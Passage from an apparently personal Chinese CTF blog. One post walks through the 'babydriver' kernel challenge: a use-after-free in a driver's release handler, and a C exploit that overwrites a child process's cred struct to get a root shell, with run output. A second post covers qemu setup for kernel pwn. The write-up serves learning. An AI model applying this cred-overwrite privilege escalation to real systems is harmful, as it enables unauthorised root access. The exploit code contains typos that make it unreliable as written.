<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应ioctl函数，如果传进来的参数command等于0x10001,那就kfree掉babydevice.buf，然后再申请一个堆，堆的大小是传进来的参数，也就是说我们能够控制，再把堆的大小赋值给babydevice.buf_len</p>
<p><strong>babyrelease</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应close函数，逻辑就是kfree掉babydevice.buf</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>babydevice_t是全局变量，所有打开这个设备的进程都会共享这个变量，至于原因我刚开始以为是多线程共享变量之类的，之后在查阅资料中说是<strong>所有进程内核态的变量都指向同一片物理内存</strong>，有点道理，但不知道说的对不对就是了。</p>
<p>漏洞出在了bayrelease函数上，当kfree掉一个堆后没有清理指针，如果两次打开设备，把第一个设备babyrelease掉，此时第二个设备的babydevice_t.buf就储存着刚才free掉的堆的地址，构成了ufa.</p>
<p>浏览别人的wp发现是这样利用这个ufa的，由于这个内核版本过低，所以管理进程权限的cred结构体的申请和一般堆的申请相同，而且这个版本的cred结构体的大小是0xa8,那就可以打开两次设备，然后用第一个设备再ioctl一个0xa8的堆块，然后再babyrelease,这个第二个堆块的babydevice_t.buf就记录着0xa8的free的堆的地址，然后我们再fork()一个子进程，申请到储存这个子进程的cred的堆就是我们刚才free掉的堆，我们就可以利用第二个设备对这个子进程的cred进行改写了。</p>
<p>exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1=open(<span class="string">&#x27;/dev/babydev&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2=open(<span class="string">&#x27;/dev/babydev&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">    inctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;fork fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于是第一次写kerenlpwn的脚本，所以几乎全部都参考了别人的代码，这份代码中有几处我之前没听说过的地方，下面记录一下</p>
<p><strong>fork函数</strong></p>
<p>这是一个父进程产生一个子进程的函数，当一个父进程调用fork()函数的时候实际上最后fork函数被调用了两次，在父函数中调用fork函数时会创建一个子进程并返回子进程的id,在子进程中也会有fork函数，他也会调用，不过这时候就不会返回一个新的子进程不然就死循环了，他会返回0，所以上面的代码中执行system(“/bin/sh”)的实际上是子进程，不是父进程。</p>
<p><strong>getuid</strong></p>
<p>获得cred结构体中uid的值，这个值决定着这个进程的权限，当uid为0的时候代表这个进程是root权限。</p>
<p><strong>权限修改</strong></p>
<p>cred结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当把cred的uid~fsgid全部覆盖为0的话对应进程就提升为root</p>
<p><strong>提权过程</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译exp</span></span><br><span class="line">gcc exp.c -static -o exp</span><br><span class="line"><span class="meta">#</span><span class="bash">打包文件系统</span></span><br><span class="line"> find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="meta">#</span><span class="bash">加载内核</span></span><br><span class="line">./boot.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">执行exp</span></span><br><span class="line">exp    exp.c</span><br><span class="line">~ $ ./exp</span><br><span class="line">[   13.823599] device open</span><br><span class="line">[   13.825222] device open</span><br><span class="line">[   13.826817] alloc done</span><br><span class="line">[   13.828409] device release</span><br><span class="line">ok</span><br><span class="line">/home/ctf # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br></pre></td></tr></table></figure>

<p>可见已经提权至root.</p>
<h2 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压bzTmage得到vmlinux</span></span><br><span class="line"><span class="meta">/usr/src/linux-headers-$</span><span class="bash">(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line"><span class="meta">#</span><span class="bash">vmlinux是没有压缩的内核镜像，里面可能含有符号表，也可以用来搜索gadget,这道题暂时用不到vmlinux</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">在boot.sh中添加-gdb tcp::1234 我的虚拟机不能在后面加-S,不然抓不到程序，搜了一下好像是gdb和gdbserver版本不匹配的问题。</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">先运行启动脚本，再使用gdb ./vmlinux启动gdb,并连接到qemu</span></span><br><span class="line">target remote localhost:1234</span><br><span class="line"><span class="meta">#</span><span class="bash">加入ko文件的符号表，类似这样的命令add-symbol-file core.ko textaddr</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> add-symbol-file babydriver.ko 0xffffffffc0000000</span></span><br><span class="line">add symbol table from file &quot;babydriver.ko&quot; at</span><br><span class="line">    .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from babydriver.ko...done.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">然后就可以调试了</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b babyopen</span></span><br><span class="line">► 0xffffffffc0000030 &lt;babyopen&gt;       nop    dword ptr [rax + rax]</span><br><span class="line">   0xffffffffc0000035 &lt;babyopen+5&gt;     push   rbp</span><br><span class="line">   0xffffffffc0000036 &lt;babyopen+6&gt;     mov    rdi, qword ptr [rip - 0x3de3bc0d]</span><br><span class="line">   0xffffffffc000003d &lt;babyopen+13&gt;    mov    edx, init_module+28           &lt;64&gt;</span><br><span class="line">   0xffffffffc0000042 &lt;babyopen+18&gt;    mov    esi, 0x24000c0</span><br><span class="line">   0xffffffffc0000047 &lt;babyopen+23&gt;    mov    rbp, rsp</span><br><span class="line">   0xffffffffc000004a &lt;babyopen+26&gt;    call   0xffffffff811ea180            &lt;0xffffffff811ea180&gt;</span><br><span class="line"> </span><br><span class="line">   0xffffffffc000004f &lt;babyopen+31&gt;    mov    rdi, -0x3fffefcc</span><br><span class="line">   0xffffffffc0000056 &lt;babyopen+38&gt;    mov    qword ptr [rip + 0x2473], rax</span><br><span class="line">   0xffffffffc000005d &lt;babyopen+45&gt;    mov    qword ptr [rip + 0x2470], init_module+28 &lt;64&gt;</span><br><span class="line">   0xffffffffc0000068 &lt;babyopen+56&gt;    call   0xffffffff8118b077            </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了很多东西，解决了kernelpwn的第一道题（也是最简单的一道）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/" class="post-title-link" itemprop="url">内核pwn的环境搭建和初认识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-10 20:31:19 / 修改时间：20:33:39" itemprop="dateCreated datePublished" datetime="2022-02-10T20:31:19+08:00">2022-02-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内核pwn"><a href="#内核pwn" class="headerlink" title="内核pwn"></a>内核pwn</h1><p>今天就先不刷pwnabe.tw上的题了，开整内核方面的东西。</p>
<h2 id="0x1-环境搭建"><a href="#0x1-环境搭建" class="headerlink" title="0x1 环境搭建"></a>0x1 环境搭建</h2><p>搭建1起来没有lot环境搭建困难，通过搭建环境也了解了很多东西，我第一次知道文件系统居然是独立的，以前以为一直和内核紧密相连，也越来越理解一切皆文件这句话了，不管是设备还是什么，都可以当做文件操作，真的很神奇。</p>
<p>我是借鉴（照抄）这个博客搭建环境的<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/258874%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E7%BB%86%E5%BE%88%E6%A3%92%EF%BC%8C%E4%B8%8D%E4%BB%85%E8%AE%B2%E4%BA%86%E4%B8%80%E4%BA%9B%E5%8E%9F%E7%90%86%EF%BC%8C%E8%BF%98%E5%BE%88%E7%BB%86%E8%87%B4%E7%9A%84%E6%8A%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%AE%B2%E6%98%8E%E7%99%BD%E4%BA%86%EF%BC%8C%E5%9C%A8%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E6%88%91%E4%B8%BB%E8%A6%81%E5%8D%A1%E5%9C%A8%E4%B8%A4%E4%B8%AA%E5%9C%B0%E6%96%B9%E4%BA%86%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AF%E6%88%91%E4%B8%8D%E4%BA%86%E8%A7%A3Makefile,%E6%8A%8AM%E5%B0%8F%E5%86%99%E4%BA%86%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%BC%96%E8%AF%91%E6%A8%A1%E5%9D%97%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%80%E7%9B%B4%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E5%BD%93%E6%97%B6%E9%83%BD%E5%BF%AB%E8%87%AA%E9%97%AD%E4%BA%86%EF%BC%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%98%AF%E6%95%B4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%9C%A8etc%E7%9A%84initab%E7%BC%96%E5%86%99%E7%9A%84%E6%97%B6%E5%80%99%E6%9C%89%E6%9D%A1%E6%8C%87%E4%BB%A4%E4%B8%8D%E8%83%BD%E7%85%A7%E6%90%AC%EF%BC%8C%E5%8E%9F%E5%8D%9A%E5%AE%A2%E6%8C%87%E4%BB%A4%E5%A6%82%E4%B8%8B">https://www.anquanke.com/post/id/258874，写的很细很棒，不仅讲了一些原理，还很细致的把环境搭建讲明白了，在搭建过程中，我主要卡在两个地方了，一个是我不了解Makefile,把M小写了，导致编译模块的时候一直不成功，当时都快自闭了，另一个是整文件系统的时候，在etc的initab编写的时候有条指令不能照搬，原博客指令如下</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>正确指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">ttyS0::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>至于原因，我没看懂😃，剩下的照抄就行了，然后kernel就能通过qemu正确运行了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/pwn$ ./boot.sh</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">mount: mounting none on /sys failed: No such device</span><br><span class="line"></span><br><span class="line">Please press Enter to activate this console. </span><br><span class="line">/ # ls</span><br><span class="line">bin      etc      init     lib64    proc     sbin     usr</span><br><span class="line">dev      home     lib      linuxrc  root     sys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-内核初理解"><a href="#0x2-内核初理解" class="headerlink" title="0x2 内核初理解"></a>0x2 内核初理解</h2><h4 id="内核是什么东西"><a href="#内核是什么东西" class="headerlink" title="内核是什么东西"></a>内核是什么东西</h4><p>内核并不是什么神奇的东西，他也是一个程序，一切的行为都有对应代码支撑，他的定位就是中间层，对上提供用户态程序的运行和对用户态提供抽象的操作硬件的api,对下直接和硬件相互交互的程序。</p>
<h4 id="内核和用户态的切换"><a href="#内核和用户态的切换" class="headerlink" title="内核和用户态的切换"></a>内核和用户态的切换</h4><p>当发生系统调用，产生异常，外设产生中断等事件的时候，会发生用户态到内核太的切换，一般的函数调用思路就是保存当前栈帧的状态，然后跳到新地址，内核态和用户态的切换也是类似，其中用户态到内核态的切换具体过程如下（照搬的）</p>
<ol>
<li><p>通过 <code>swapgs</code> 切换 GS 段寄存器（代码段寄存器），将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p>
</li>
<li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入<code>RSP/ESP</code>。</p>
</li>
<li><p>通过 push 保存各寄存器值，具体的</p>
<p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* 保存栈值，并设置内核栈 */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li>
</ol>
<p>内核态到用户态的切换也是如此</p>
<h4 id="内核的分级保护域"><a href="#内核的分级保护域" class="headerlink" title="内核的分级保护域"></a>内核的分级保护域</h4><p>简称rings,感觉就是权限的意思，大部分现代操作系统只采用ring0权限和ring3权限，ring0权限就是root,kernel就是ring0，ring3权限较低，一般用户态程序就是ring3,以我目前的粗略理解，kernelpwn就是通过内核模块的漏洞对用户态程序进行提权到root然后getshell。</p>
